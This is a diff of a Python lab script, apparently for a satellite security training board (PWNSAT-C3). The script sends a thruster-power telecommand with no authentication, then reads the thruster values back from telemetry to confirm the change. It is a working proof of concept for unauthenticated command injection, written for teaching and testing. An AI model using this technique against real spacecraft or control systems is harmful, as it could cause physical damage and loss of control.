@@ -21,7 +21,28 @@ from pathlib import Path
 
 sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "lib"))
 
-from flatsat import FlatSat, TC_SET_THRUSTER, TC_GET_STATUS  # noqa: E402
+from flatsat import (FlatSat, TC_GET_PAYLOAD_STATUS, TC_GET_STATUS,  # noqa: E402
+                     TC_SET_THRUSTER)
+
+# The thruster values ride in SEND_TM (0x08), not in STATUS, and SEND_TM is a
+# heartbeat every 14 to 30 seconds. Polling STATUS for them, which is what
+# this lab used to do, shows the operator's view and never the change.
+TM_THRUSTER_OFFSET = 17
+
+
+def read_thrusters(fsat, seq, wait=35.0):
+    """Both thruster powers, out of the next SEND_TM. None if none arrives."""
+    for p in fsat.send(TC_GET_PAYLOAD_STATUS, b"", seq=seq & 0x3FFF, listen=wait):
+        if p.apid != 0x08:
+            continue
+        body = fsat.plaintext(p)
+        if len(body) > TM_THRUSTER_OFFSET + 1:
+            return (body[TM_THRUSTER_OFFSET], body[TM_THRUSTER_OFFSET + 1])
+    return None
+
+
+def fmt(pair):
+    return "not seen yet" if pair is None else f"0={pair[0]}  1={pair[1]}"
 
 
 def main() -> int:
@@ -40,14 +61,33 @@ def main() -> int:
     with FlatSat(port=args.port, encrypt=not args.cleartext) as fsat:
         print("\n=== 1. state before ===")
         fsat.send(TC_GET_STATUS, b"", seq=args.seq, listen=1.2)
+        before = read_thrusters(fsat, args.seq + 10)
+        print(f"[*] thrusters before: {fmt(before)}")
 
         print(f"\n=== 2. thruster {args.thruster_id} to {args.power}, no credential ===")
-        fsat.send(TC_SET_THRUSTER, bytes([args.thruster_id & 0xFF, args.power & 0xFF]),
-                  seq=args.seq + 1, listen=1.0)
+        replies = fsat.send(TC_SET_THRUSTER,
+                            bytes([args.thruster_id & 0xFF, args.power & 0xFF]),
+                            seq=args.seq + 1, listen=1.0)
+        for p in replies:
+            if p.apid == 0x09:
+                reason = fsat.plaintext(p).split(b"\x00", 1)[0]
+                print(f"[!] the board refused: "
+                      f"{reason.decode('ascii', 'replace').strip()}")
         print("[*] Note what did NOT come back: SET_THRUSTER acknowledges nothing.")
 
         print("\n=== 3. state after ===")
-        fsat.send(TC_GET_STATUS, b"", seq=args.seq + 2, listen=1.2)
+        after = read_thrusters(fsat, args.seq + 11)
+        print(f"[*] thrusters after:  {fmt(after)}")
+
+        if before is None or after is None:
+            print("[*] no telemetry frame arrived in the window. The values "
+                  "are on the PWNSAT-C3 panel; give it half a minute.")
+        elif after[args.thruster_id] == args.power:
+            print(f"[+] thruster {args.thruster_id} is at {args.power}, and "
+                  f"nothing authenticated the command that put it there.")
+        elif before == after:
+            print("[-] the values did not move. The command was accepted and "
+                  "had no effect, which is worth a finding of its own.")
 
         if args.restore:
             print("\n=== 4. putting it back ===")
